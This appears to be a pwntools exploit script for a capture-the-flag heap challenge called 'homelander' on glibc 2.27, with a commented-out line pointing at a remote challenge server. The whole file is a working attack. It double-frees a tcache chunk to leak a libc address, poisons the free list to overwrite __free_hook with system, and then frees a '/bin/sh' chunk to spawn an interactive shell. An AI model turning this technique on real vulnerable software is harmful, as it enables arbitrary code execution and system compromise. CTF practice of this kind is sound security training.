from pwn import *
#r = remote('203.34.119.237', 11340)
r = process("./homelander")
libc = ELF('./libc6_2.27-3ubuntu1_amd64.so', checksec=False)
def add(p, l, t):
	r.sendlineafter('Choice: ', '1')
	r.sendlineafter('): ', str(p))
	r.sendlineafter(': ', str(l))
	r.sendlineafter(': ', t)
def edit(p, t):
	r.sendlineafter('Choice: ', '2')
	r.sendlineafter('): ', str(p))
	r.sendlineafter(': ', t)
def view(p):
	r.sendlineafter('Choice: ', '3')
	r.sendlineafter('): ', str(p))
	r.recvline()
	return int(r.recvline()[:-1][::-1].encode('hex'), 16)
def erase(p):
	r.sendlineafter('Choice: ', '4')
	r.sendlineafter('): ', str(p))
add(1, 0x7d, 'asdf')
add(2, 0x7d, 'asdf')
add(3, 0x7d, 'asdf')
add(4, 0x7d, 'asdf')
add(5, 0x7d, 'asdf')
add(6, 0x7d, 'asdf')
add(7, 0x7d, 'asdf')
erase(7)
erase(6)
erase(5)
erase(4)
erase(3)
erase(2)
erase(1)
erase(1)
leak = view(1)
print 'leak', hex(leak)
libc.address += leak-4111520
edit(2, '/bin/sh\x00')
edit(1, p64(libc.symbols['__free_hook']))
add(8, 0x7d, 'asdf')
add(9, 0x7d, p64(libc.symbols['system']))
erase(2)
r.interactive()
